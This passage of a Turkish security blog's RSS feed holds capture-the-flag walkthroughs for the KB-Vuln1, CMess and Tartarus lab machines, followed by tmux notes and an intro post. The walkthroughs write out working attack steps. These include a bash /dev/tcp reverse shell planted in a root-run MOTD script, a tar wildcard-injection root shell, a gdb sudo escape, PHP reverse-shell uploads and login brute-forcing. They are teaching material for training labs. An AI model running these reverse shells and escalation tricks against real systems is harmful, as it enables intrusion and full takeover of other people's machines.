echo <span style="color:#e6db74">&#34;\n\t\t\tWELCOME TO THE KB-SERVER\n&#34;</span>
whoami
</code></pre></div><p>Ssh bağlantısı kesilip tekrardan erişim sağlandığında 00-header dosyası içerisinde çalıştırılan dosyaların root yetkisi ile çalıştırıldığı görülmektedir.</p>
<pre><code class="language-terminal" data-lang="terminal">sysadmin@192.168.56.102's password: 

			WELCOME TO THE KB-SERVER

root &lt;--- Eklenen komut Çıktısı
Last login: Thu Sep 17 19:06:26 2020 from 192.168.56.1
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.
</code></pre><p>Yüksek yetki ile shell bağlantısı sağlamak için 00-header dosyasına aşağıda yer alan komut eklenir ve tekrar erişim sağlanıldığında 4444 numaralı porta shell bağlantısı düşmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.101/4444 &lt;&amp;1&#39;&#34;</span> &gt;&gt; 00-header 
</code></pre></div>
    <img src="/images/vulnhub/kb-vuln1/header2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
</div>

    <img src="/images/vulnhub/kb-vuln1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
Root dizinine gidilir ve flag.txt dosyası okunarak makina çözümlemesi tamamlanır.

</div>

    <img src="/images/vulnhub/kb-vuln1/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>THM CMess Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/</link>
            <pubDate>Tue, 15 Sep 2020 20:03:12 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/</guid>
            <description>Merhaba, bu yazımda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...  1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.190.58   cmess.thm  alan adı  /etc/hosts  dosyasına dns çözümlemesi için eklenmesi, makina tasarımcı tarafından istenmektedir.  sudo nano /etc/hosts -------------------- ##Ekleme 10.</description>
            <content type="html"><![CDATA[

<div style="text-align:justify;">
Merhaba, bu yazımda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...
</div>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.190.58 
</code></pre></div>
    <img src="/images/thm/cmess/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
<i style="color:yellow"><b> cmess.thm </b></i> alan adı <i style="color:yellow"><b> /etc/hosts </b></i> dosyasına dns çözümlemesi için eklenmesi, makina tasarımcı tarafından istenmektedir. 
</div>
<pre><code class="language-terminal" data-lang="terminal">    sudo nano /etc/hosts
    --------------------
    ##Ekleme
    10.10.173.46    cmess.thm
</code></pre><p>

<div style="text-align:justify;">
Tarayıcı ile web servisine istek atılır. İçerik yönetim yazılımlarından olan Gila CMS web sayfası açılmaktadır.
</div>

    <img src="/images/thm/cmess/website.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Web dizininde yer alan dosyalar ve klasörlerin tespiti için gobuster kullanılır.</p>
<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://10.10.190.58 -w /usr/share/wordlists/dirb/common.txt 
</code></pre><pre><code>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.190.58
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/05 09:53:31 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/01 (Status: 200)
/1 (Status: 200)
/1x1 (Status: 200)
/about (Status: 200)
/About (Status: 200)
/admin (Status: 200)
/api (Status: 200)
/assets (Status: 301)
/author (Status: 200)
/blog (Status: 200)
/category (Status: 200)
/feed (Status: 200)
/fm (Status: 200)
/Index (Status: 200)
/index (Status: 200)
/lib (Status: 301)
/log (Status: 301)
/login (Status: 200)
/robots.txt (Status: 200)
/search (Status: 200)
/Search (Status: 200)
/server-status (Status: 403)
/sites (Status: 301)
/src (Status: 301)
/tag (Status: 200)
/tags (Status: 200)
/themes (Status: 301)
/tmp (Status: 301)
===============================================================
2020/09/05 09:54:20 Finished
===============================================================

</code></pre>

<div style="text-align:justify;">
Nmap ve gobuster taramalarında robots.txt dosyası içerisinde <i style="color:yellow"> /src, /themes, /lib </i> dizin girdileri yer almaktadır. Ayrıca /login dizinine girildiğinde giriş paneli görülmektedir.
</div>
<p>
    <img src="/images/thm/cmess/login.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Web dizininde yapılan alt dizin taramalarında herhangi bir kullanıcı adı ve parola bilgileri tespit edilememiştir. Wfuzz aracı ile subdomain taraması yapılarak alt alan adları tespit edilmeye çalışılır.Wordlist olarak SecLists listeler topluluğu içerisinde yeralan en çok kullanılan dns listesi kullanılır.
</div></p>
<p><strong>SecList Kurulumu</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">##Zip Olarak Kurulumu</span>
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">&amp;&amp;</span> unzip SecList.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">&amp;&amp;</span> rm -f SecList.zip

<span style="color:#75715e">##Git İle Kurulumu</span>
git clone https://github.com/danielmiessler/SecLists.git
</code></pre></div><pre><code>wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://cmess.thm&quot;  -H &quot;Host: FUZZ.cmess.thm&quot; --hw 290
</code></pre><p>
    <img src="/images/thm/cmess/wfuzz.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">


Tespit edilen subdomain önce <i style="color:yellow"> /etc/hosts </i> dosyasına subdomain.cmess.thm şekilde olacak şekilde eklenir ve adrese gidilir. İçerisinde bir kullanıcının destek ekibi ile yaptığı kullanıcı parola sıfırlama işlemine ait yazışmalar yer almaktadır. 
</div></p>
<p>
    <img src="/images/thm/cmess/passrecovery.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Kullanıcıya ait giriş bilgileri ile login panelinden giriş yapılır. CMS yönetim paneli açılmaktadır.
</div></p>

    <img src="/images/thm/cmess/webadmin.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Web panelinden shell almak için soldaki  <strong>Content -&gt; File Manager -&gt; File Upload</strong>  sekmesi takip edilerek <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> kodlarının yer aldığı php sayfası upload edilir. Upload edilen dosya <strong>src/assets</strong> klasörü altında yer almaktadır.</p>

    <img src="/images/thm/cmess/upload.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<pre><code class="language-terminal" data-lang="terminal">nc -lvp 4444
</code></pre>

<div style="text-align:justify;">
Upload ettiğimiz reverse shell dosyasında ayarlanan port dinlenmeye başlanır. Tarayıcı üzerinde reverse.php dosyası çağırılır ve shell bağlantısı gerçekleştirilir.
<br><br>
</div>

    <img src="/images/thm/cmess/nc.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<p><strong>www-data</strong> kullanıcısı ile sisteme erişim sağladığından yetki yükseltmek için <a href="https://github.com/rebootuser/LinEnum">LinEnum betiği</a> çalıştırlarak bilgi toplanır. Elde edilen bilgilerde <strong><em>/opt</em></strong> dizini altında gizli bir password yedek dosyası görülmektedir. İçeriğine bakıldığında <em>andres</em> kullanısına ait oturum parolası elde edilir.</p>

    <img src="/images/thm/cmess/userpass.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> su andres 
</code></pre></div><p>komutu ile andres kullanıcısı ile oturum açılır. Daha sonra /home/andres dizininde yer alan user.txt dosyası okunur.</p>

    <img src="/images/thm/cmess/userflag.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Yetki yükseltme aşamasında zamanlanmış görevler, suid ve sgid biti aktif dosyalar, alınmış yedekler ve zayıf dosya yetkileri vb. kontrol edilir. Testlerde yaygın olarak sistem hakkında bilgiler <a href="https://github.com/rebootuser/LinEnum">LinEnum betiği</a> kullanılarak elde edilir. Crontab içeriğinde tar uygulaması ile zamanlamış yedekleme işlemi dikkat çekmektedir. Backup klasöründeki herşey /tmp klasörü altına yedeklenmektedir.</p>

    <img src="/images/thm/cmess/crontab.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<p>Tar uygulamasında wilcard injection metodu ile yetki yükseltilebilmektedir. Linux sistemlerde joker karakter (wildcard) olarak kullanılan çeşitli karakterler vardır. Bunlardan bazıları <code>{* , ?, [], -, ~ }</code> .
Bunlar işlem yapılmadan önce kabuk tarafından yorumlanır. Tar ile uygulamasına bakacak olursak,yedeklenecek klasör içerisinde 3 adet dosya oluşturulur.</p>
<ol>
<li>Çalıştırılacak kabuk dosyası</li>
<li>Tar uygulamasının parametre olarak alacağı 2 adet dosya</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.8.97.33/6666 &lt;&amp;1&#39;&#34;</span> &gt; shell.sh
echo <span style="color:#e6db74">&#34;&#34;</span> &gt; <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
echo <span style="color:#e6db74">&#34;&#34;</span> &gt; --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>Backup klasör içeriğine bakıldığında oluşturulan dosyalar görülmektedir.</p>

    <img src="/images/thm/cmess/tarwilcard.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />


<p>Tar uygulaması çalıştığında - - ile başlayan dosyaları parametre olarak alacak ve shell.sh dosyasını çalıştıracaktır. Shell dosyasında ayarlanan port dinlemeye alınır ve yedekleme çalıştığında root yetkisi ile oturum elde edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ nc -lvp 6666
listening on [any] 6666 ...
connect to [10.8.97.33] from cmess.thm [10.10.173.46] 46366
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
root@cmess:/home/andre/backup# cd
root@cmess:~# ls
root.txt
root@cmess:~# cat root.txt
**************************
root@cmess:~# 
</code></pre>]]></content>
        </item>
        
        <item>
            <title>THM Tartarus Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/thm-tartarus-write-up/</link>
            <pubDate>Sat, 12 Sep 2020 20:53:26 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/thm-tartarus-write-up/</guid>
            <description>Merhaba, Siber güvenliğe yeni başlayanların ofansif yeteneklerini geliştirebileceği TryHackMe platformunda yer alan, başlangıç seviyesi olan Tartarus adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...  1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.236.165  Tarayıcı ile web servisine istek atılır. Apache yazılımına ait varsayılan web sayfası açılmaktadır.
Web dizininde yer alan dosyalar ve klasörlerin tespiti için gobuster kullanılır.</description>
            <content type="html"><![CDATA[

<div style="text-align:justify;">
Merhaba, Siber güvenliğe yeni başlayanların ofansif yeteneklerini geliştirebileceği TryHackMe platformunda yer alan, başlangıç seviyesi olan Tartarus adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...
</div>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.236.165 
</code></pre></div>
    <img src="/images/thm/tartarus/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Tarayıcı ile web servisine istek atılır. Apache yazılımına ait varsayılan web sayfası açılmaktadır.</p>

    <img src="/images/thm/tartarus/webpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Web dizininde yer alan dosyalar ve klasörlerin tespiti için gobuster kullanılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.236.165 -w /usr/share/wordlists/dirb/common.txt 
</code></pre></div>
    <img src="/images/thm/tartarus/gobuster.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Gobuster sonucunda robots.txt dosyası dikkat çekmektedir. Robots.txt, arama motoru örümcekleri sitenizin hangi bölümlerini dizine ekleyebileceğini, hangi dizini taraması gerektiğini, hangi arama motoru yazılımının giriş izni olduğunu veya olmadığını söylemeye yarayan basit bir komut dosyasıdır. Dosya içeriği okunur.
</div>

    <img src="/images/thm/tartarus/robots.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>

<div style="text-align:justify;">
Arama motorları tarafından indexlenmesi engellenen <i>/admin-dir</i> dizine giriş yapılır. Dizinde muhtemel kullanıcı adı ve parola listeleri yer almaktadır. Listeler indirilir.  Ftp servisinde anonim olarak erişime açık olan test.txt dosyası incelenir.
</div>

    <img src="/images/thm/tartarus/cat.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>ftp dizininde dolaşılarak araştırmaya devam edilir. <strong>{&hellip;}</strong> dizini dikkat çekmektedir. Dizin içerisindeki <strong><em>yougotgoodeyes.txt</em></strong> isimli dosya indirilir ve içeriği okunur.</p>

    <img src="/images/thm/tartarus/ftpd.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>İçerisinde bir dizin adı yer almaktadır.</p>
<p>
    <img src="/images/thm/tartarus/secretdir.png"  alt="Hello Friend"  class="left"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Tarayıdan giriş yapıldığında bir login ekranı çıkmaktadır. Elde edilen bilgiler ile burpsuite aracı kullanılarak kaba kuvvet saldırısı yapılır. 

iki adet parametre ve iki ayrı liste olduğundan intruder -> Payload Options -> Cluster Bomb seçilerek kaba kuvvet saldırısı için ayarlamalar yapılır. Ayrıntılı bilgi için aşağıdaki linke bakılabilir.
</div>
<strong><em><a href="https://portswigger.net/support/using-burp-to-brute-force-a-login-page">https://portswigger.net/support/using-burp-to-brute-force-a-login-page</a></em></strong></p>
<p>Username ve Password parametleri işaretlenir.</p>

    <img src="/images/thm/tartarus/burp1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Username ve Password parametleri için denenecek verilerin olduğu listeler yüklenir.</p>

    <img src="/images/thm/tartarus/username.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/thm/tartarus/passwd.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Saldırı sonucunda kullanıcı adı ve parola bilgisi elde edilir.</p>

    <img src="/images/thm/tartarus/result.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Elde edilen oturum bilgileri ile giriş yapılır. Dosya yükleme sayfası gelmektedir. Reverse shell almak için bir <a href="https://github.com/pentestmonkey/php-reverse-shell">php</a> sayfası upload edilir.</p>

    <img src="/images/thm/tartarus/upload.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Gobuster aracı ile <i style="color:yellow">/sUp3r-s3cr3t</i>  dizini altında dosyanın upload edildiği yeri bulmak için dizin taraması yapılır. Tarama sonucunda image dizini tespit edilir. Bu dizin içerisinde de yükleninen php dosyası bulunmamaktadır. <i style="color:yellow">/sUp3r-s3cr3t/images</i> dizini altında da tarama yapılır ve uploads dizini tespit edilir. 
</div>

    <img src="/images/thm/tartarus/upload2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>

<div style="text-align:justify;">
Localhosttan netcat ile 4444 portu dinlenmeye başlanır. Daha sonra http://10.10.236.156/sUp3r-s3cr3t/images/uploads/reverse.php adresine gidilir ve terminal bağlantısı sağlanır.
</div>

    <img src="/images/thm/tartarus/ncat.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Düşük kullanıcı ile shell alındığından user.txt dosyasını okumak için yetki yükselmek gereklidir.
<code>sudo -l </code> komutu girilir.</p>

    <img src="/images/thm/tartarus/nc2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<strong> Thirtytwo </strong> adlı kullanıcı için <i> var/www/gbd</i> uygulaması parola gerektirmeden çalıştırılabildiği tespit edilmektedir. Aşağıda yer alan komut ile kullanıcı bağlanır ve gdb istismar edilerek  thirtytwo kullanıcısına giriş yapılır.
</div>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u thirtytwo /var/www/gdb -nx -ex <span style="color:#e6db74">&#39;!sh&#39;</span> -ex quit
</code></pre></div>
    <img src="/images/thm/tartarus/32.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Python pty modülü kullanılarak interaktif shelle geçilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Home dizininde yer alan diğer kullanıcı dizininde yer alan user.txt dosyası okunur.</p>

    <img src="/images/thm/tartarus/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Yetki yükseltme aşamasında crontab da zamanlanmış görevlere bakıldığında root yetkisi ile cleanup.py dosyasının her iki dakikada bir çalıştırıldığı görülmektedir.</p>

    <img src="/images/thm/tartarus/crontab.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dosyanın yetkilerine bakıldığında içeriğinin değiştirilebileceği görülmektedir.</p>

    <img src="/images/thm/tartarus/ls.png"  alt="Hello Friend"  class="left"  style="border-radius: 10px;"  />


<p>Cleanup.py dosyasının içeriği aşağıdaki gibi değiştirilir.</p>

    <img src="/images/thm/tartarus/pri.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Netcat ile 5555 numaralı port dinlenir. Zamanlanmış görev çalıştığında root yetkisi ile reverse shell bağlantısı sağlanmış olur.</p>

    <img src="/images/thm/tartarus/reverse.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Root dizini altında yer alan root.txt dosyası okunurak makina tamamlanır.

    <img src="/images/thm/tartarus/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>$Tmux Notları</title>
            <link>https://barcode91.github.io/posts/2020/08/tmux-notlar%C4%B1/</link>
            <pubDate>Mon, 31 Aug 2020 22:53:43 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/08/tmux-notlar%C4%B1/</guid>
            <description>Tmux -&amp;gt; Terminal Multiplexer
Tmux bir terminal çoklayıcıdır. Bir terminal ekranında birden fazla pencere ve bu pencere içerisinde biden fazla bölme oluşturulabilmektedir. Terminal üzerinde çalışanlar için oldukça bir araçtır.
Kurulum #Debian, Ubuntu ve Türevleri için Kurulum Komutları $ sudo apt-get install tmux #Centos Kurulum Komutları $ yum -y install tmux Çalıştırma ve Kullanım #Tmux çalıştırılması $tmux Tmux çeşitli tuş kombinasyonları ile kullanılmaktadır. Komutlar prefix key tuşuna basıldıktan sonra girilmektedir.
Prefix Key =&amp;gt; Crtl+B Tuşlara aynı anda basılır ve bırakılır daha sonra diğer tuşlara basılır.</description>
            <content type="html"><![CDATA[<p><em>Tmux -&gt; Terminal Multiplexer</em></p>
<p>Tmux bir terminal çoklayıcıdır. Bir terminal ekranında birden fazla pencere ve bu pencere içerisinde biden fazla bölme oluşturulabilmektedir. Terminal üzerinde çalışanlar için oldukça bir araçtır.</p>
<h2 id="kurulum">Kurulum</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    <span style="color:#75715e">#Debian, Ubuntu ve Türevleri için Kurulum Komutları</span>
    $ sudo apt-get install tmux

    <span style="color:#75715e">#Centos Kurulum Komutları</span>
    $ yum -y install tmux
</code></pre></div><h2 id="çalıştırma-ve-kullanım">Çalıştırma ve Kullanım</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    <span style="color:#75715e">#Tmux çalıştırılması</span>
    $tmux
</code></pre></div><p>Tmux çeşitli tuş kombinasyonları ile kullanılmaktadır. Komutlar prefix key tuşuna basıldıktan sonra girilmektedir.</p>
<p><strong>Prefix Key =&gt; Crtl+B</strong>  Tuşlara aynı anda basılır ve bırakılır daha sonra diğer tuşlara basılır.</p>
<p>Ctrl+B Tuş Kombinasyonundan sonra kullanılan tuşlar;</p>
<pre><code class="language-tmux" data-lang="tmux">    % pencereleri dikey olarak böler
    &quot; pencereleri yatay olarak böler 
    &lt;Yön Tuşları&gt; pencereler arası gezinti
</code></pre><h2 id="pencerelerin-kapatılması">Pencerelerin Kapatılması</h2>
<p>Aktif pencere de <strong><em>$ exit</em></strong> komutu yazılarak yada <strong><em>Ctrl+D</em></strong> tuş kombinasyonu kullanılarak bölme kapatılır.</p>
<h2 id="pencere-yönetimi">Pencere Yönetimi</h2>
<p>Ctrl+B Tuş Kombinasyonundan sonra</p>
<pre><code class="language-tmux" data-lang="tmux">
    c Yeni pencere açar
    p Bir önceki pencere
    n Bir sonraki pencere
    x Pencereyi kapat (y/n)

</code></pre><p>Daha fazlası için <strong><em>$man tmux</em></strong></p>
]]></content>
        </item>
        
        <item>
            <title>$touch First</title>
            <link>https://barcode91.github.io/posts/2020/08/touch-first/</link>
            <pubDate>Mon, 24 Aug 2020 19:41:25 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/08/touch-first/</guid>
            <description>Kısa bir giriş Bilginin paylaştıkça çoğaldığına inanırım. Ayrıca Yunus Emre&amp;rsquo;nin güzel sözünüde hatırlamak gerekir; &amp;ldquo;Bölüşürsek tok oluruz, bölünürsek yok oluruz&amp;rdquo;. Hal böyle iken edindiğim bilgileri siz değerli insalarla paylaşmayı kendime bir vazife belledim.
Blogumda siber güvenlik, network, bulut bilişim teknolojilerine dair bilgiler paylaşacağım.
 Siber güvenlik alanında hackthebox, tryhackme, priviahub vb. platformlarda yer alan zafiyetli makinalar ile challenge çözümleri Network alanında router, switch yapılandırmaları, network trafiğinin monitör edilmesi için kullanılan araçlar ve kurulumları gibi konular Bulut Bilişim alanında ise docker, kubernets, openvswitch vb.</description>
            <content type="html"><![CDATA[<h1 id="kısa-bir-giriş">Kısa bir giriş</h1>
<p>Bilginin paylaştıkça çoğaldığına inanırım. Ayrıca Yunus Emre&rsquo;nin güzel sözünüde hatırlamak gerekir; <em>&ldquo;Bölüşürsek tok oluruz, bölünürsek yok oluruz&rdquo;</em>. Hal böyle iken edindiğim bilgileri siz değerli insalarla paylaşmayı kendime bir vazife belledim.</p>
<p>Blogumda siber güvenlik, network, bulut bilişim teknolojilerine dair bilgiler paylaşacağım.</p>
<ul>
<li>Siber güvenlik alanında hackthebox, tryhackme, priviahub vb. platformlarda yer alan zafiyetli makinalar ile challenge çözümleri</li>
<li>Network alanında router, switch yapılandırmaları, network trafiğinin monitör edilmesi için kullanılan araçlar ve kurulumları gibi konular</li>
<li>Bulut Bilişim alanında ise docker, kubernets, openvswitch vb. konular</li>
</ul>
<p><strong>Sürçi lisan ettik ise affola&hellip;</strong></p>
]]></content>
        </item>
        
    </channel>
</rss>
